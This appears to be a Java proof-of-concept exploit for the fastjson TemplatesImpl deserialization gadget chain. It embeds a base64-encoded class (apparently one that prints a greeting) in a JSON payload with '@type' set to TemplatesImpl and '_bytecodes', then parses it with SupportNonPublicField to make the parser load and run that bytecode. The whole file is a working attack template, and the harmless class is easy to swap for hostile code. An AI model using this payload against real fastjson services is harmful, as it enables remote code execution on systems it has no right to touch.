package com.json;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.io.IOUtils;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

// TemplatesImpl 链子的 EXP
public class TemplatesImplPoc {
    public static String readClass(String cls){
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            IOUtils.copy(new FileInputStream(new File(cls)), bos);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return Base64.encodeBase64String(bos.toByteArray());
    }

    public static void main(String args[]){
        try {
            ParserConfig config = new ParserConfig();
            final String fileSeparator = System.getProperty("file.separator");
//            final String evilClassPath = "D:/Code/Java/Java unserialize/demo/src/main/java/com/example/TempClass.class";
//            String evilCode = readClass(evilClassPath);
            String evilCode = "yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBAA5UZW1wQ2xhc3MuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABFjb20vY2MxL1RlbXBDbGFzcwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAGQAAAAMAAAABsQAAAAEACgAAAAYAAQAAAA0ACwAAAAQAAQAMAAEABwANAAIACQAAABkAAAAEAAAAAbEAAAABAAoAAAAGAAEAAAASAAsAAAAEAAEADAABAA4ADwABAAkAAAAtAAIAAQAAAA0qtwABsgACEgO2AASxAAAAAQAKAAAADgADAAAAFQAEABYADAAXAAEAEAAAAAIAEQ";
            final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
            String text1 = "{\"@type\":\"" + NASTY_CLASS +
                    "\",\"_bytecodes\":[\""+evilCode+"\"],'_name':'0w0','_tfactory':{ },\"_outputProperties\":{ }}";
            System.out.println(text1);

            Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);
            //Object obj = JSON.parse(text1, Feature.SupportNonPublicField);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
